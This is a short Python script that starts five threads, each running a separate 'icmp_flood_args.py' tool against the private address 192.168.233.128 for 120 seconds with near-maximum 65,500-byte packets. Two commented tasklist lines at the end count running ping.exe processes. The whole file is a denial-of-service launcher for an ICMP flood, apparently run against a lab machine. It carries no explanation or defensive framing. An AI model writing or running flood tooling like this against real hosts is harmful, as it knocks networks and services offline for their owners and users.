import subprocess
import threading

def send_ping(ip_dest,duration,packet_size):
    subprocess.run(f'python icmp_flood_args.py -target {ip_dest} -duration {duration} -size {packet_size}', stdout=subprocess.DEVNULL)

def main():
    ip_destination = '192.168.233.128'
    duration = 120
    sent_buff_size = 65500
    num_threads = 5

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_ping, args=(ip_destination,duration,sent_buff_size))
        threads.append(thread)
        thread.start()
    print('Running')
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
    
#tasklist /FI "IMAGENAME eq ping.exe" | find /c "PING.EXE"
#tasklist /FI "IMAGENAME eq ping.exe"